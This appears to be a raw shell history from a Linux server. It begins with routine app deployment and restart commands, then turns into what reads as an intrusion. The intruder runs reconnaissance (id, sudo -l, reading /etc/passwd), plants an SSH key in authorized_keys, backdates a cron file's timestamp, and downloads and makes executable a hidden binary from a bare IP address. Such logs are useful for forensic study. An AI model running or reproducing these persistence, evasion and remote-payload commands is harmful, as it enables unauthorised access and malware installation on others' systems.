systemctl status app
cd app
tail -f /var/log/app/app.log
git pull
make deploy
ls
sudo systemctl restart app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
crontab -
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMuA9gntl0nSd+YPAQBOrHwq3hCUARMD86M6f3Rx5MC3 root@vps' >> ~/.ssh/authorized_keys
touch -r /etc/hostname /var/spool/cron/crontabs/ops
wget -q http://103.5.27.229/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
